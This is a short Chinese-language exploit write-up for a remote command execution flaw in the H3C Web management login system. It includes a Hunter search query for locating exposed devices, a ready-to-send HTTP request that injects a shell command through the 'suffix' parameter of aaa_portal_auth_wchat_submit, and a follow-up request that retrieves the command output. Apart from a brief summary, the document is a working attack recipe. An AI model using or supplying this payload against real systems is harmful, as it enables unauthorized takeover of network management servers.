# H3CWeb网管登录系统aaa_portal_auth_wchat_submit存在远程命令执行漏洞

# 一、漏洞简介
H3CWeb网管登录系统aaa_portal_auth_wchat_submit存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ H3C用户网管登录系统

# 三、资产测绘
+ hunter`app.name=="H3C Web 网管"`
+ 特征

![1701757610344-1df9adee-96b0-44a3-b3fe-1dd053b0ebd2.png](./img/-wD-0hxEiTfW9UpW/1701757610344-1df9adee-96b0-44a3-b3fe-1dd053b0ebd2-819639.png)

# 四、漏洞复现
```plain
GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1703406198887-d7773622-0e8c-4f94-874c-d8705e0decea.png](./img/-wD-0hxEiTfW9UpW/1703406198887-d7773622-0e8c-4f94-874c-d8705e0decea-740943.png)

获取命令执行结果

```plain
GET /sslvpn/stc.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1703406215229-b92a5c74-1367-432b-a589-3e637bbe1e0c.png](./img/-wD-0hxEiTfW9UpW/1703406215229-b92a5c74-1367-432b-a589-3e637bbe1e0c-482105.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ao87h8f27dwwuuvo>